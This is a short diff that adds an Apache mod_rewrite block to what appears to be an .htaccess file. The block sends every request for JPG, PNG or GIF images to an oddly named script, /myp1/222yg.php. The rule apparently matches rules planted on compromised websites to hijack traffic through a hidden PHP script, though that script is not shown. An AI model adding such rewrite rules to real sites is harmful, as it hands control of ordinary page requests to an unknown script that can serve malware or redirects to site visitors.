@@ -1,0 +1,4 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteRule .*\.(jpg|png|gif)$ /myp1/222yg.php [L]
+</IfModule>
